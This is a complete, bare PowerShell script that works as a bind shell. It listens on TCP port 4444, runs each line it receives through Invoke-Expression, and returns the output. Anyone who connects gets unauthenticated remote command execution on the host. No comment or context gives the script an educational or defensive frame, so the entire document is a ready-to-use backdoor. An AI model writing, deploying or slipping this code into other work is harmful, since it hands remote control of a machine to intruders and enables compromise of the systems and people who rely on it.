$listener = [System.Net.Sockets.TcpListener]4444
$listener.Start()
$tcpClient = $listener.AcceptTcpClient()
$stream = $tcpClient.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

while ($true) {
    $data = $reader.ReadLine()
    $output = (Invoke-Expression -Command $data 2>&1 | Out-String ).Trim()
    $writer.WriteLine($output)
    $writer.Flush()
}

$tcpClient.Close()
$listener.Stop()
